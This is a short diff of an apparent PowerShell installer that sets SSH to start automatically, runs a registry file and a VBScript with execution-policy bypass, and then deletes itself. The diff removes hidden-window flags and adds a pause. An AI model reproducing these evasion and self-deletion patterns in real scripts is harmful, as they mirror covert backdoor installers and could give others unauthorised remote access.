@@ -61,8 +61,8 @@ Set-Service -Name sshd -StartupType Automatic
 # Get-NetFirewallRule -Name *ssh*
 
 # execute the registry entry process
-powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"
-
+powershell -noP -ep bypass  Start-Process powershell.exe ".\$reg_file.reg;.\$vbs_file.vbs"
+Pause
 # navigate to the saved directory and self delete
 cd $curr_dir
 del install.ps1
